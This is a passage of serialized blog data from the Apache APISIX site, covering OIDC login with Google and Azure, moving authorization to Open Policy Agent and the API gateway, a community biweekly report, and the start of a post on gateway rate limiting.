Consent Screen](https://console.cloud.google.com/apis/credentials/consent).\\n\\nIn the project context, navigate _APIs & Services | Credentials_.\\n\\n![Google Cloud - Credentials menu](https://static.apiseven.com/uploads/2023/06/13/bYAZa9TL_google-cloud-credentials.jpg)\\n\\nThen, press the _+ CREATE CREDENTIALS_ button in the upper menu bar.\\n\\n![Google Cloud - Create Credentials button](https://static.apiseven.com/uploads/2023/06/13/k9I8i35H_google-cloud-create-credentials.jpg)\\n\\nSelect _OAuth Client Id_ in the scrolling menu.\\n\\n![Google Cloud - Choose credentials type](https://static.apiseven.com/uploads/2023/06/13/8J3eCFDY_google-cloud-choose-credentials.jpg)\\n\\nFill in the fields:\\n\\n* Application type: Web application\\n* Name: whatever you want\\n* Authorized redirect URIs: `<URL>/callback`, _e.g._, `http://localhost:9080/callback`\\n\\n![Google Cloud - Create OAuth Client id](https://static.apiseven.com/uploads/2023/06/13/FS4fntju_google-cloud-create-oauth-client-id.jpg)\\n\\n`URL` should be the URL of the web application. Likewise, `/callback` should match the `openid-connect` plugin configuration above. Note that Google doesn\'t allow relative URLs, so if you need to reuse the application in different environments, you need to add the URL of each environment. Click the _Create_ button.\\n\\n![Google Cloud - OAuth client created](https://static.apiseven.com/uploads/2023/06/13/0CRBKPtt_google-cloud-oauth-client-created.jpg)\\n\\nIn the Docker Compose configuration above, use the Client ID and Client Secret as `OIDC_CLIENTID` and `OIDC_SECRET`. I wrote them down as environment variables in a `.env` file.\\n\\nThe last missing variable is `OIDC_ISSUER`: it\'s `accounts.google.com`. If you navigate to <https://accounts.google.com/.well-known/openid-configuration>, you\'ll see all data required by OAuth 2.0 (and more).\\n\\nAt this point, we can start our setup with `docker compose up`. When we navigate to <http://localhost:9080/>, the browser redirects us to the Google authentication page. Since I\'m already authenticated, I can choose my ID - and I need one bound to the organization of the project I created above.\\n\\n![Choose the Google account you want to authenticate with](https://static.apiseven.com/uploads/2023/06/13/yckQhlJf_google-auth-choose-account.jpg)\\n\\nThen, I can freely access the resource.\\n\\n## Configuring Azure for OIDC\\n\\nMy colleague Bobur has already [described everything](https://dev.to/apisix/api-security-with-oidc-by-using-apache-apisix-and-microsoft-azure-ad-50h3) you need to do to configure Azure for OIDC.\\n\\nWe only need to change the OIDC parameters:\\n\\n* `OIDC_CLIENTID`\\n* `OIDC_SECRET`\\n* `OIDC_ISSUER`: on Azure, it should look something like `login.microsoftonline.com/<TENANT_ID>/v2.0`\\n\\nIf you restart Docker Compose with the new parameters, the root page is now protected by Azure login.\\n\\n## Conclusion\\n\\nExternalizing your authentication process to a third party may be sensible, but you want to avoid binding your infrastructure to its proprietary process. OpenID Connect is an industry standard that allows switching providers easily.\\n\\nApache APISIX offers a plugin that integrates OIDC so that you can protect your applications with the latter. There\'s no reason not to use it, as all dedicated identity providers, such as Okta and Keycloak, are OIDC-compatible.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/openid-authentication).\\n\\n**To go further:**\\n\\n* [OpenID Connect](https://openid.net/connect/)\\n* [OpenID Connect Discovery 1.0 specification](https://openid.net/specs/openid-connect-discovery-1_0.html)\\n* [Apache APISIX OIDC plugin](https://apisix.apache.org/docs/apisix/plugins/openid-connect/)\\n* [API Security with OIDC by using Apache APISIX and Microsoft Azure AD](https://dev.to/apisix/api-security-with-oidc-by-using-apache-apisix-and-microsoft-azure-ad-50h3)\\n* [Use Keycloak with API Gateway to secure APIs](https://apisix.apache.org/blog/2022/07/06/use-keycloak-with-api-gateway-to-secure-apis/)\\n* [How to Use Apache APISIX Auth With Okta](https://api7.ai/blog/how-to-use-apisix-auth-with-okta)"},{"id":"Make your security policy auditable","metadata":{"permalink":"/blog/2023/03/02/security-policy-auditable","source":"@site/blog/2023/03/02/security-policy-auditable.md","title":"Make your security policy auditable","description":"Last week, I wrote about putting the right feature at the right place. I used rate limiting as an example, moving it from a library inside the application to the API Gateway. Today, I\'ll use another example: authentication and authorization.\\n","date":"2023-03-02T00:00:00.000Z","formattedDate":"March 2, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.805,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Authenticate with OpenID Connect and Apache APISIX","permalink":"/blog/2023/03/09/authenticate-openid-connect"},"nextItem":{"title":"Biweekly Report (Feb 13 - Feb 26)","permalink":"/blog/2023/03/02/weekly-report-0226"}},"content":">Last week, I wrote about [putting the right feature at the right place](https://blog.frankel.ch/right-feature-right-place/). I used rate limiting as an example, moving it from a library inside the application to the API Gateway. Today, I\'ll use another example: authentication and authorization.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/security-policy-auditable/\\" />\\n</head>\\n\\n## Securing a Spring Boot application\\n\\nI\'ll keep using Spring Boot in the following because I\'m familiar with it. The Spring Boot application offers a REST endpoint to check employees\' salaries.\\n\\nThe specific use case is taken from the Open Policy Agent site (more later):\\n\\n>Create a policy that allows users to request their own salary as well as the salary of their direct subordinates.\\n\\nWe need a way to:\\n\\n1. Authenticate an HTTP request as coming from a known user\\n2. Check whether the user has access to the salary data\\n\\nIn any other case, return a `401`.\\n\\nI\'ll pass an authentication token in the request to keep things simple. I won\'t rely on a dedicated authentication/authorization backend, such as Keycloak, but it should be a similar approach if you do.\\n\\nTo enable Spring Security on the app, we need to add the Spring Boot Security Starter.\\n\\n```xml\\n<dependency>\\n    <groupId>org.springframework.boot</groupId>\\n    <artifactId>spring-boot-starter-security</artifactId>\\n</dependency>\\n```\\n\\nWe also need to enable Spring Security to work its magic:\\n\\n```kotlin\\n@SpringBootApplication\\n@EnableWebSecurity\\nclass SecureBootApplication\\n```\\n\\nWith those two steps in place, we can start securing the application according to the above requirement:\\n\\n```kotlin\\ninternal fun security() = beans {                                       //1\\n    bean {\\n        val http = ref<HttpSecurity>()\\n        http {\\n            authorizeRequests {\\n                authorize(\\"/finance/salary/**\\", authenticated)          //2\\n            }\\n            addFilterBefore<UsernamePasswordAuthenticationFilter>(\\n                TokenAuthenticationFilter(ref())                        //3\\n            )\\n            httpBasic { disable() }\\n            csrf { disable() }\\n            logout { disable() }\\n            sessionManagement {\\n                sessionCreationPolicy = SessionCreationPolicy.STATELESS\\n            }\\n        }\\n        http.build()\\n    }\\n    bean { TokenAuthenticationManager(ref(), ref()) }                   //4\\n}\\n```\\n\\n1. Use the Kotlin Beans DSL - because I can\\n2. Only allow access to the endpoint to authenticated users\\n3. Add a filter in the filter chain to replace regular authentication\\n4. Add a custom authentication manager\\n\\nRequests look like the following:\\n\\n```bash\\ncurl -H \'Authorization: xyz\'  localhost:9080/finance/salary/bob\\n```\\n\\nThe filter extracts from the request the necessary data used to decide whether to allow the request or not:\\n\\n```kotlin\\ninternal class TokenAuthenticationFilter(authManager: AuthenticationManager) :\\n    AbstractAuthenticationProcessingFilter(\\"/finance/salary/**\\", authManager) {\\n\\n    override fun attemptAuthentication(req: HttpServletRequest, resp: HttpServletResponse): Authentication {\\n        val header = req.getHeader(\\"Authorization\\")                   //1\\n        val path = req.servletPath.split(\'/\')                         //2\\n        val token = KeyToken(header, path)                            //3\\n        return authenticationManager.authenticate(token)              //4\\n    }\\n\\n    // override fun successfulAuthentication(\\n}\\n```\\n\\n1. Get the authentication token\\n2. Get the path\\n3. Wrap it under a dedicated structure\\n4. Try to authenticate the token\\n\\nIn turn, the manager tries to authenticate the token:\\n\\n```kotlin\\ninternal class TokenAuthenticationManager(\\n    private val accountRepo: AccountRepository,\\n    private val employeeRepo: EmployeeRepository\\n) : AuthenticationManager {\\n  override fun authenticate(authentication: Authentication): Authentication {\\n    val token = authentication.credentials as String? ?:                       //1\\n        throw BadCredentialsException(\\"No token passed\\")\\n    val account = accountRepo.findByPassword(token).orElse(null) ?:            //2\\n        throw BadCredentialsException(\\"Invalid token\\")\\n    val path = authentication.details as List<String>\\n    val accountId = account.id\\n    val segment = path.last()\\n    if (segment == accountId) return authentication.withPrincipal(accountId)   //3\\n    val employee = employeeRepo.findById(segment).orElse(null)                 //4\\n    val managerUserName = employee?.manager?.userName\\n    if (managerUserName != null && managerUserName == accountId)               //5\\n        return authentication.withPrincipal(accountId)                         //5\\n    throw InsufficientAuthenticationException(\\"Incorrect token\\")               //6\\n  }\\n}\\n```\\n\\n1. Get the authorization token passed from the filter\\n2. Try to find the account that has this token. For simplicity\'s sake, the token is stored in plain text without hashing\\n3. If the account tries to access its data, allow it\\n4. If not, we must load the hierarchy from another repo.\\n5. If the account attempts to access data from an employee they manage, allow it.\\n6. Else, deny it.\\n\\nThe whole flow can be summarized as the following:\\n\\n![Spring Security Obfuscated Flow](http://www.plantuml.com/plantuml/svg/VL9DIyD04BtlhnXoKh6qYgVYHui6AuYLfj3pT3CbmNHtsGzh_VMwsOIbA-QGXFbuyzwRoSnOrDRj6uRSIWtEa0Oqa476k1HMomPGgJOrLofZ9LhSeY50pgKJreHI5yGwq5uryaWK6l8-oZnH_OcMMYxM4exkFSaKdlCrZ7UrGC5fRB11VHmVAXaXg1JpSde0huX_mDpPIkhw6sqjnMbpIQVOniARF0KyC0YsRqUZC5MJTLh0pUIAKME80NISlUSf5Fbh_hY62zWiybKEx_EYs2nNJt07Vbpax01XH628gI0kRUmrXemVDw0Fe5COSCk3WABTMy3zWxoUJ7mvOdk7yMf_BBxqvW2YmTZV5gBBD5_I02Ivvw8cZPfNnpFZjbANjK1BvX8Kskey4U1XAKLCXgKKSKgodC7r90iQEaBe5IMBN__sJw8gXk7th-gIO2UbtSelDli5k7tp0m00)\\n\\nNow, we can try some requests.\\n\\n```bash\\ncurl -H \'Authorization: bob\' localhost:9080/finance/salary/bob\\n```\\n\\n`bob` asks for his own salary, and it works.\\n\\n```bash\\ncurl -H \'Authorization: bob\' localhost:9080/finance/salary/alice\\n```\\n\\n`bob` asks for the salary of one of his subordinates, and it works as well.\\n\\n```bash\\ncurl -H \'Authorization: bob\' localhost:9080/finance/salary/alice\\n```\\n\\n`alice` asks for her manager\'s salary, which is not allowed.\\n\\nThe code above works perfectly but has one big issue: there\'s no way to audit the logic. One must know Kotlin and how Spring Security works to ensure the implementation is sound.\\n\\n## Introducing Open Policy Agent\\n\\nOpen Policy Agent, or OPA for short, describes itself as \\"Policy-based control for cloud native environments\\".\\n\\n>Stop using a different policy language, policy model, and policy API for every product and service you use. Use OPA for a unified toolset and framework for policy across the cloud native stack.\\n>\\n>Whether for one service or for all your services, use OPA to decouple policy from the service\'s code so you can release, analyze, and review policies (which security and compliance teams love) without sacrificing availability or performance.\\n>\\n>-- [OPA Website](https://www.openpolicyagent.org/)\\n\\nIn short, OPA allows writing policies and offers a CLI and a daemon app to evaluate them.\\n\\nYou write policies in a specific interpreted language named [Rego](https://www.openpolicyagent.org/docs/latest/policy-language/), and I must admit it\'s not fun. Anyway, here\'s our above policy written in \\"clear\\" text:\\n\\n```rego\\npackage ch.frankel.blog.secureboot\\n\\nemployees := data.hierarchy                                 #1\\n\\ndefault allow := false\\n\\n# Allow users to get their own salaries.\\nallow {\\n    input.path == [\\"finance\\", \\"salary\\", input.user]         #2\\n}\\n\\n# Allow managers to get their subordinates\' salaries.\\nallow {\\n    some username\\n    input.path = [\\"finance\\", \\"salary\\", username]            #3\\n    employees[input.user][_] == username                    #3\\n}\\n```\\n\\n1. Get the employee hierarchy somehow (see below)\\n2. If the account requests their salary, allow access\\n3. If the account requests the salary of a subordinate, allow access\\n\\nI used two variables in the above snippet: `input` and `data`. `input` is the payload that the application sends to OPA. It should be in JSON format and has the following form:\\n\\n```json\\n{\\n    \\"path\\": [\\n        \\"finance\\",\\n        \\"salary\\",\\n        \\"alice\\"\\n    ],\\n    \\"user\\": \\"bob\\"\\n}\\n```\\n\\n## More Open Policy Agent goodness\\n\\nHowever, OPA can\'t decide on the input alone, as it doesn\'t know the employee\'s hierarchy. One approach would be to load the hierarchy data on the app and send it to OPA. A more robust approach is to let OPA access external data to separate responsibilities cleanly. OPA offers [many options](https://www.openpolicyagent.org/docs/latest/external-data/) to achieve it. Here, I pretend to extract data from the `Employee` database, bundle it together with the policy file, serve the bundle via HTTP, and configure OPA to load it at regular intervals.\\n\\n![Bundle refresh](http://www.plantuml.com/plantuml/svg/VLB1JiCm3BtdAwoUG6BZNb6q8are7DZ4E71D6tUDb3MLauwDhwTf6ZLK6wSwVlQpttDNndAotL4nNbfDW6TBFk86adLu9Knmomjk45gjP7aPuDqGHXWUMwKlYCPtXrV2IjrOqWfqomTekyiJLkYk4PnwhbOQUHw0lELbZP3lDllDLyHSzAKAMPR1YukcDHe1hWYop2cG9svn4i6KrYta5WWFdU84ih589wuCYvGkdaUs52gqPVqNcqJTWCCZXRVzzbrMbwc3mPMTGE2rR4pgV4f7pNT-juU9zNwYTOLnwzDYuNi9RKVDIE57nXqbeOizF9ljascewPFwXFHDqkADtR4HxZ8VM16QUYG85mb3_xc5Wzra_n-ayBh-X4VFOiRlqd9Q7duYvRwOZTzuSK8kFAUp8v1UiS93ONmmpelmhi-SdlleXCzIjHG8bTQsq6UswWkwe_e5)\\n\\nNote that you shouldn\'t use Apache APISIX only to serve static files. But since I\'ll be using it in the next evolution of my architecture, I want to avoid having a separate HTTP server to simplify the system.\\n\\nNow that we moved the decision logic to OPA, we can replace our code with a request to the OPA service. The new version of the authentication manager is:\\n\\n```kotlin\\ninternal class OpaAuthenticationManager(\\n    private val accountRepo: AccountRepository,\\n    private val opaWebClient: WebClient\\n) : AuthenticationManager {\\n\\n    override fun authenticate(authentication: Authentication): Authentication {\\n        val token = authentication.credentials as String? ?:                       //1\\n            throw BadCredentialsException(\\"No token passed\\")\\n        val account = accountRepo.findByPassword(token).orElse(null) ?:             //1\\n            throw BadCredentialsException(\\"Invalid token\\")\\n        val path = authentication.details as List<String>\\n        val decision = opaWebClient.post()                                         //2\\n            .accept(MediaType.APPLICATION_JSON)\\n            .contentType(MediaType.APPLICATION_JSON)\\n            .bodyValue(OpaInput(DataInput(account.id, path)))                      //3\\n            .exchangeToMono { it.bodyToMono(DecisionOutput::class.java) }          //4\\n            .block() ?: DecisionOutput(ResultOutput(false))                        //5\\n        if (decision.result.allow) return authentication.withPrincipal(account.id) //6\\n        else throw InsufficientAuthenticationException(\\"OPA disallow\\")             //6\\n    }\\n}\\n```\\n\\n1. Keep the initial *authentication* logic\\n2. Replace the authorization with a call to the OPA service\\n3. Serialize the data to conform to the JSON input that the OPA policy expects\\n4. Deserialize the result\\n5. If something is wrong, the default should be to disallow\\n6. Abide by OPA\'s result\\n\\nThe flow is now the following:\\n\\n![Spring Security flow with OPA](http://www.plantuml.com/plantuml/svg/VLB1RXCn4BtxAvxs18YGW3X551h12eHGKpMLUk7YsbDYuNeisqifNyzEt5ZPgirXlPetyzuRF_aq5vtASEkLDeKJXam9EgD3f-BOSSP57GfqZ3ju5MEdh2xwMcU2DeQ7K79jFHITCXnAOW-EUjTPdwywqNT_TA6TXP83iu-YkyJN_XBp6nTqC3JFskjqFx_RSgF8b1g_HZ1RCh-n6igMa_kdY-Cm7ROqvVg2CvuIFYdKstwOpQfgeZAaWFUBjufy9WLKptRD9JRzZ_xp9LxXwbj_qUDyjTbShI--u0GYrpptX2eX3eUGfQS6zpjMHEIEx0SyR0WSvlAB0YNH_RvPdy65E9GwSnY60DDy3dKuwYKo1VjYHtyvuKjN0FctuMPgoRZiE43UXlqPEDGLNYEoT-OUEbZ8stbQqz8Zg8KdTRl-tkLPZYzjvasYF8proOXwlfDGdutrtM8XxHRiyVW12bRLKxvfe59EdllMMS8DSxdcl-fq90ot_Zy0)\\n\\nAt this point, we moved the authorization logic from the code to OPA.\\n\\n## Moving authentication to the API Gateway\\n\\nThe next and final step is to move the *authentication* logic The obvious candidate is the API Gateway since we set Apache APISIX in the previous step. In general, we should use the capabilities of the API Gateway as much as possible and fall back to libraries for the rest.\\n\\nApache APISIX has multiple authentication plugins available. Because I used a bearer token, I\'ll use [key-auth](https://apisix.apache.org/docs/apisix/plugins/key-auth/). Let\'s create our users, or in Apache APISIX terms, _consumers_:\\n\\n```yaml\\nconsumers:\\n  - username: alice\\n    plugins:\\n      key-auth:\\n        key:  alice\\n  - username: betty\\n    plugins:\\n      key-auth:\\n        key:  betty\\n  - username: bob\\n    plugins:\\n      key-auth:\\n        key:  bob\\n  - username: charlie\\n    plugins:\\n      key-auth:\\n        key:  charlie\\n```\\n\\nNow, we can protect the Spring Boot upstream:\\n\\n```yaml\\nroutes:\\n  - uri: /finance/salary*\\n    upstream:\\n      type: roundrobin\\n      nodes:\\n        \\"boot:8080\\": 1\\n    plugins:\\n      key-auth:\\n        header: Authorization                    #1\\n      proxy-rewrite:\\n        headers:\\n          set:\\n            X-Account: $consumer_name            #2\\n```\\n\\n1. Authenticate with `key-auth` and the `Authorization` header\\n2. Sets the consumer id in the `X-Account` HTTP header for the upstream\\n\\nAPISIX guarantees that requests that reach the Spring Boot app are authenticated. The code only needs to call the OPA service and follow the decision. We can entirely remove Spring Security and replace it with a *simple* filter:\\n\\n```kotlin\\nbean {\\n    val repo = ref<EmployeeRepository>()\\n    router {\\n        val props = ref<AppProperties>()\\n        val opaWebClient = WebClient.create(props.opaEndpoint)\\n        filter { req, next -> validateOpa(opaWebClient, req, next) }\\n        GET(\\"/finance/salary/{user_name}\\") {\\n          // ...\\n        }\\n    }\\n}\\n\\ninternal fun validateOpa(\\n    opaWebClient: WebClient,\\n    req: ServerRequest,\\n    next: (ServerRequest) -> ServerResponse\\n): ServerResponse {\\n    val httpReq = req.servletRequest()\\n    val account = httpReq.getHeader(\\"X-Account\\")                           //1\\n    val path = httpReq.servletPath.split(\'/\').filter { it.isNotBlank() }\\n    val decision = opaWebClient.post()                                     //2\\n        .accept(MediaType.APPLICATION_JSON)\\n        .contentType(MediaType.APPLICATION_JSON)\\n        .bodyValue(OpaInput(DataInput(account, path)))\\n        .exchangeToMono { it.bodyToMono(DecisionOutput::class.java) }\\n        .block() ?: DecisionOutput(ResultOutput(false))\\n    return if (decision.result.allow) next(req)\\n    else ServerResponse.status(HttpStatus.UNAUTHORIZED).build()\\n}\\n```\\n\\n1. Get the account name from the API Gateway\\n2. Nothing changes afterward\\n\\nThe final flow is the following:\\n\\n![Final flow without Spring Security](http://www.plantuml.com/plantuml/svg/TL5DJp8n4BxtLqpszBw921fFH0KEnk01IF3WmSlG3cwJqZRz4FZtbhBMtIpiORlppFEndPdwW2x4dMB8Wt4GFJb03nLKR6EY5kYEW5PwUSZmp2Al2MQh-Nh-KJ5kT7169OPjslOFD1Opk5pDgfEz_CP0EO7bcC5pupo6rvTt66wbHirfw56brE6-DaNL4DdvQ2inXffqa3onUdH1FGCLO652HoOc3CuNVnmCYh6Z49s6Xz4T8-M9GNhQyVRgNsTgAzWsMbk4NwJ9dPflw-K2fBOnN1O9kkPZB8x1anR_iln_Lv-w6KXd8PTGGJnTmsZOe2VngTDNzhW1QvJaHq0jG630ovw2UX1QcsUNwj_1bPIh6XKAvzQHZwb-IgWo-qacT7PYY-_zQ9JRPIbzNbbSvcd1pk_kC5jbDc2r50HROyB67DWq2U9E_G00)\\n\\n## Conclusion\\n\\nEverything looks like a nail when all you\'ve got is a hammer. Developers\' mighty hammer of choice is code. I\'ve written tons of code to solve problems, and later on, I\'ve used even more libraries to solve even more problems. As you evolve from developer to architect, you increase the number of tools you have. In this regard, code is only one tool among many. Your organization has many infrastructure tools you can leverage to develop solutions at minimal costs.\\n\\nIn this post, I\'ve shown how you can leverage OPA and Apache APISIX to move your authentication and authorization logic from the code to the infrastructure. The former allows you to audit your security policies, the latter coherence among all your upstream across all tech stacks.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/secure-boot).\\n\\n**To go further:**\\n\\n* [Spring Security](https://docs.spring.io/spring-security/reference/index.html)\\n* [Open Policy Agent](https://www.openpolicyagent.org/)\\n* [OPA Bundles](https://www.openpolicyagent.org/docs/latest/management-bundles/)\\n* [Rego playground](https://play.openpolicyagent.org/)\\n* [Spring Security Authorization with OPA](https://www.baeldung.com/spring-security-authorization-opa)"},{"id":"Biweekly Report (Feb 13 - Feb 26)","metadata":{"permalink":"/blog/2023/03/02/weekly-report-0226","source":"@site/blog/2023/03/02/weekly-report-0226.md","title":"Biweekly Report (Feb 13 - Feb 26)","description":"The cloud-native API gateway Apache APISIX has added functions such as enabling opentelemetry plugin to support https upstream and adding \'range_id\' algorithm for \'request-id\' plugin.","date":"2023-03-02T00:00:00.000Z","formattedDate":"March 2, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.96,"truncated":true,"authors":[],"prevItem":{"title":"Make your security policy auditable","permalink":"/blog/2023/03/02/security-policy-auditable"},"nextItem":{"title":"The right feature at the right place","permalink":"/blog/2023/02/23/right-feature-right-place"}},"content":"> From 2.13 to 2.26, 23 contributors submitted 51 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\nWe have also sorted out some issues for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/03/02/EKeV5LO5_1280X1280.PNG)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/03/02/Gs550zSG_06b436c4-d10b-47d0-b610-cc9325a913.png)\\n\\n## Good First Issues\\n\\n### Issue #8772\\n\\n**Link:** [https://github.com/apache/apisix/issues/8772](https://github.com/apache/apisix/issues/8772)\\n\\n**Description:** Set validation on custom claims in OIDC auth, so that users can restrict access to the backend based on that rule.\\n\\n### Issue #1075\\n\\n**Link:** [https://github.com/apache/apisix-ingress-controller/issues/1075](https://github.com/apache/apisix-ingress-controller/issues/1075)\\n\\n**Description:** Add regression tests using `apisix:dev` for APISIX Ingress to detect compatibility issues with the latest APISIX changes as early as possible.\\n\\n## Highlights of Recent Features\\n\\n- [`opentelemetry` plugin supports https upstream](https://github.com/apache/apisix/pull/8823) (Contributor: [yangxikun](https://github.com/yangxikun))\\n\\n- [Add head method support to Admin API](https://github.com/apache/apisix/pull/8752) (Contributor: [An-DJ](https://github.com/An-DJ))\\n\\n- [Stream subsystem support tars service discovery](https://github.com/apache/apisix/pull/8826) (Contributor: [ronething](https://github.com/ronething))\\n\\n- [Add \'range_id\' algorithm for \'request-id\' plugin](https://github.com/apache/apisix/pull/8790) (Contributor: [jiangfucheng](https://github.com/jiangfucheng))\\n\\n- [Use env var for `vault token`](https://github.com/apache/apisix/pull/8866) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n## Recent Blog Recommendations\\n\\n- [Accessing APISIX-Dashboard from Everywhere with Keycloak Authentication](https://apisix.apache.org/blog/2023/01/02/accessing_apisix-dashboard_from_everywhere_with_keycloak_authentication/)\\nThis guest blog describes how to setup an external access to apisix-dashboard protecting the URL with authentication managed by a keycloak server.\\n\\n- [How to Integrate API Gateway and Consul? Not Consul K/V](https://apisix.apache.org/blog/2023/01/18/consul-with-apisix/)\\nApache APISIX supports the Consul service discovery registry. This article will walk you through the process of implementing service discovery and service registry in Apache APISIX.\\n\\n- [Securing Admin Access to Apache APISIX](https://apisix.apache.org/blog/2023/02/09/secure-apisix-admin/)\\nIn this short blog post, a couple of ways is listed to secure your Apache APISIX admin access.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"The right feature at the right place","metadata":{"permalink":"/blog/2023/02/23/right-feature-right-place","source":"@site/blog/2023/02/23/right-feature-right-place.md","title":"The right feature at the right place","description":"Before moving to Developer Relations, I transitioned from Software Architect to Solution Architect long ago. It\'s a reasonably common career move. The problem in this situation is two-fold:\\n1. You know perfectly well software libraries 2. You don\'t know well infrastructure components\\nIt seems logical that people in this situation try to solve problems with the solutions they are most familiar with. However, it doesn\'t mean it\'s the best approach. It\'s a bad one in most cases.\\n","date":"2023-02-23T00:00:00.000Z","formattedDate":"February 23, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.38,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Biweekly Report (Feb 13 - Feb 26)","permalink":"/blog/2023/03/02/weekly-report-0226"},"nextItem":{"title":"Securing Admin Access to Apache APISIX","permalink":"/blog/2023/02/09/secure-apisix-admin"}},"content":"> Before moving to Developer Relations, I transitioned from Software Architect to Solution Architect long ago. It\'s a reasonably common career move. The problem in this situation is two-fold:\\n>\\n> 1. You know perfectly well software libraries\\n> 2. You don\'t know well infrastructure components\\n>\\n>It seems logical that people in this situation try to solve problems with the solutions they are most familiar with. However, it doesn\'t mean it\'s the best approach. It\'s a bad one in most cases.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/right-feature-right-place/\\" />\\n</head>\\n\\n## A concrete example\\n\\nImagine an API application. It runs on the JVM, and it\'s written in the \\"Reactive\\" style with the help of the Spring Boot framework.\\n\\nOne of the requirements is to limit the number of calls a user can make in a timeframe. In the API world, such a Rate Limiting feature is widespread.\\n\\nWith my software architect hat on, I\'ll search for a JVM library that does it. Because I have a bit of experience, I know of the excellent Bucket4J library:\\n\\n>Java rate-limiting library based on token-bucket algorithm\\n>\\n>-- [Bucket4J](https://github.com/bucket4j/bucket4j)\\n\\nIt\'s just a matter of integrating the library into my code:\\n\\n```kotlin\\nval beans = beans {\\n    bean {\\n        val props = ref<BucketProperties>()                  //1\\n        BucketFactory().create(                              //2\\n            props.size,\\n            props.refresh.tokens,\\n            props.refresh.duration\\n        )\\n    }\\n    bean {\\n        coRouter {\\n            val handler = HelloHandler(ref())                //3\\n            GET(\\"/hello\\") { handler.hello(it) }\\n            GET(\\"/hello/{who}\\") { handler.helloWho(it) }\\n        }\\n    }\\n}\\n\\nclass HelloHandler(private val bucket: Bucket) {             //3\\n\\n    private suspend fun rateLimit(                           //4\\n        req: ServerRequest,\\n        f: suspend (ServerRequest) -> ServerResponse\\n    ) = if (bucket.tryConsume(1))\\n            f.invoke(req)\\n        else\\n            ServerResponse.status(429).buildAndAwait()\\n\\n    suspend fun hello(req: ServerRequest) = rateLimit(req) { //5\\n        ServerResponse.ok().bodyValueAndAwait(\\"Hello World!\\")\\n    }\\n}\\n```\\n\\n1. Get configuration properties from a `@ConfigurationProperties`-annotated class\\n2. Create a properly-configured bucket\\n3. Pass the bucket to the handler\\n4. Create a reusable rate-limiting wrapper based on the bucket\\n5. Wrap the call\\n\\nAt this point, the bucket is for the whole app. If we want a dedicated bucket per user, as per the requirements, we need to:\\n\\n1. Bring in Spring Security to authenticate users (or write our own authentication mechanism)\\n2. Create a bucket per user\\n3. Store the bucket server-side and bind it to the user session\\n\\nWhile it\'s perfectly acceptable, it\'s a lot of effort for a feature that one can implement cheaper elsewhere.\\n\\n## The golden case for API Gateways\\n\\n>A place for everything, everything in its place\\n\\nThis quote is associated with Samuel Smiles, Mrs. Isabella Beeton, and Benjamin Franklin.\\n\\nIn any case, cross-cutting features don\'t belong in the application but in infrastructure components. Our feature is an API, so it\'s a perfect use-case for an API Gateway. We can simplify the code by removing Bucket4J and configuring an API Gateway in front of the application.\\n\\nHere\'s how to do it with [Apache APISIX](https://apisix.apache.org/).\\n\\n```yaml\\nconsumers:\\n  - username: joe\\n    plugins:\\n      key-auth:                               #1\\n        key: joe\\n  - username: jane\\n    plugins:\\n      key-auth:                               #1\\n        key: jane\\nroutes:\\n  - uri: /hello*\\n    upstream:\\n      type: roundrobin\\n      nodes:\\n        \\"resilient-boot:8080\\": 1\\n    plugins:\\n      limit-req:                              #2\\n        rate: 1\\n        burst: 0\\n        key: consumer_name                    #3\\n        rejected_code: 429\\n      key-auth: ~                             #1\\n```\\n\\n1. We use a simple HTTP header for authentication for demo purposes. Real-world apps would use OAuth2.0 or OpenID Connect, but the principle is the same\\n2. Rate limiting plugin\\n3. Configure a bucket per consumer\\n\\n## Discussion: what belongs where?\\n\\nBefore answering the question, let me go through a detour first. The book [Thinking, Fast and Slow](https://en.wikipedia.org/wiki/Thinking,_Fast_and_Slow) makes the case that the brain has two \\"modes\\":\\n\\n>The book\'s main thesis is that of a dichotomy between two modes of thought: \\"System 1\\" is fast, instinctive and emotional; \\"System 2\\" is slower, more deliberative, and more logical.\\n\\nAlso, System 2 is much more energy-consuming. Because we are lazy, we tend to favor System 1 - fast and instinctive. Hence, as architects, we will generally favor the following:\\n\\n* Solutions we are familiar with, _e.g._, libraries for former software architects\\n* Rules to apply blindly. As a side comment, it\'s the main reason for herd mentality in the tech industry, such as \\"microservices everywhere\\"\\n\\nHence, take the following advice as guidelines and not rules. Now that this has been said, here\'s my stance.\\n\\nFirst, you need to categorize whether the feature is purely technical. For example, classical rate-limiting to prevent <abbr title=\\"Distributed Denial of Service\\">DDoS</abbr> is purely technical. Such technical features belong in the infrastructure: every Reverse-Proxy worth its salt has this kind of rate-limiting.\\n\\nThe more business-related a feature, the closer it must be to the application. Our use-case is slightly 